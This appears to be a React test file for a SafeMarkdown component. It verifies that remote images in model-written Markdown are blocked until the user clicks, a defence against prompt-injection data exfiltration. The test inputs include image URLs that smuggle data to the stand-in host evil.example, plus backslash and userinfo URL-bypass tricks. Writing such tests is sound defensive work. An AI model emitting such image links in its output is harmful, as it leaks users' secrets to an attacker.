// Remote images in model-written Markdown never load on render (prompt-injection exfiltration);
// they load through the backend only after a click.
import { act, cleanup, fireEvent, render, screen } from "@testing-library/react";
import { afterEach, describe, expect, it, vi } from "vitest";

const api = vi.hoisted(() => vi.fn(async (_path: string, _opts?: unknown): Promise<unknown> => ({ blob: async () => new Blob(["png"]) })));
vi.mock("../lib/api", () => ({ api }));

import { SafeMarkdown, isLocalImage } from "./SafeMarkdown";

afterEach(() => {
  cleanup();
  api.mockClear();
});

describe("isLocalImage", () => {
  it("only trusts inline, relative and 127.0.0.1 sources", () => {
    expect(isLocalImage("data:image/png;base64,AAAA")).toBe(true);
    expect(isLocalImage("blob:tauri://localhost/123")).toBe(true);
    expect(isLocalImage("images/a.png")).toBe(true);
    expect(isLocalImage("http://127.0.0.1:8765/api/file?path=a.png")).toBe(true);
    expect(isLocalImage("https://evil.example/?d=secret")).toBe(false);
    expect(isLocalImage("//evil.example/x.png")).toBe(false);
    expect(isLocalImage("http://127.0.0.1@evil.example/x.png")).toBe(false);
    expect(isLocalImage("http://localhost:9999/x.png")).toBe(false);
  });

  it("decides on the resolved URL, so backslash tricks are remote", () => {
    for (const base of ["http://127.0.0.1:8765/", "http://localhost:5173/sessions/x", "tauri://localhost/"]) {
      expect(isLocalImage("/\\evil.example/x.png", base)).toBe(base.startsWith("tauri:")); // a path on tauri://
      expect(isLocalImage("\\\\evil.example/x.png", base)).toBe(base.startsWith("tauri:"));
      expect(isLocalImage("/\\/evil.example/x.png", base)).toBe(base.startsWith("tauri:"));
      expect(isLocalImage("\\/evil.example/x.png", base)).toBe(base.startsWith("tauri:"));
      expect(isLocalImage("https:\\\\evil.example/x.png", base)).toBe(false);
      expect(isLocalImage(" //evil.example/x.png", base)).toBe(false);
      expect(isLocalImage("images/a.png", base)).toBe(true);
      expect(isLocalImage("/api/file?path=a.png", base)).toBe(true);
      expect(isLocalImage("http://127.0.0.1:8765/api/file?path=a.png", base)).toBe(true);
      expect(isLocalImage("http://user:pw@127.0.0.1:8765/a.png", base)).toBe(false);
      expect(isLocalImage("javascript:alert(1)", base)).toBe(false);
    }
    // The page's own origin, whatever its host.
    expect(isLocalImage("http://localhost:5173/a.png", "http://localhost:5173/")).toBe(true);
    expect(isLocalImage("http://localhost:5174/a.png", "http://localhost:5173/")).toBe(false);
  });

  it("never renders an image that resolves to another host", () => {
    // (Markdown percent-encodes the backslash; whatever src comes out must stay on this origin.)
    const { container } = render(<SafeMarkdown text={"![a](/\\evil.example/p.png?d=1) ![b](\\\\evil.example/p.png?d=2)"} />);
    for (const img of container.querySelectorAll("img")) {
      expect(new URL(img.getAttribute("src")!, location.href).host).toBe(location.host);
    }
    expect(api).not.toHaveBeenCalled();
  });
});

describe("SafeMarkdown", () => {
  it("shows a placeholder for remote images and loads them only after Load", async () => {
    const created = vi.fn(() => "blob:mock-1");
    Object.assign(URL, { createObjectURL: created, revokeObjectURL: vi.fn() });
    const { container } = render(
      <SafeMarkdown text={"Look ![leak](https://evil.example/p.png?d=secret) and ![ok](http://127.0.0.1:8765/api/file?path=a.png)"} />,
    );
    const srcs = [...container.querySelectorAll("img")].map((i) => i.getAttribute("src"));
    expect(srcs).toEqual(["http://127.0.0.1:8765/api/file?path=a.png"]);
    expect(screen.getByText("Remote image: evil.example")).toBeTruthy();
    expect(api).not.toHaveBeenCalled();

    await act(async () => {
      fireEvent.click(screen.getByRole("button", { name: "Load" }));
    });
    expect(api).toHaveBeenCalledWith("/remote-image", { method: "POST", body: { url: "https://evil.example/p.png?d=secret" }, raw: true });
    const after = [...container.querySelectorAll("img")].map((i) => i.getAttribute("src"));
    expect(after).toContain("blob:mock-1");
    expect(after.some((s) => s?.includes("evil.example"))).toBe(false); // never the remote URL itself
  });
});
